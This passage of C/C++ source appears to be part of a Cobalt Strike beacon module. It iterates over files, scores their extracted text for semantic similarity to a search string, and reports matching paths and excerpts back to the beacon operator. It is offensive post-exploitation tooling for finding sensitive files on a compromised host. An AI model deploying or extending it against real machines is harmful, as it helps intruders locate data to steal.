            // calculate semantic similarity
            similarity = SemanticComparison(model, reference_semantic_string, extracted_text_string, parsed_vocab);

            PRINT("Similarity: %lf\n", similarity);
            // check similarity
            if(similarity >= threshold){
                auto colonPos = reference_semantic_string.find(": ");
                BeaconPrintf(CALLBACK_OUTPUT, "Similarity: %.2f%%\nPath: %s\nExtracted string:\n%s\n\nSearch string:\n%s\n", similarity*100, fullPath.c_str(), extracted_text_string.substr(0,MIN(64, extracted_text_string.size())).c_str(), reference_semantic_string.c_str() + colonPos + 1);
            }

            // send string back to Rust to "free" it
            free_extracted_text((char*) extracted_text);
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    // Close the handle
    if(hFind != INVALID_HANDLE_VALUE && hFind != NULL){
        FindClose(hFind);
    }

    return TRUE;
}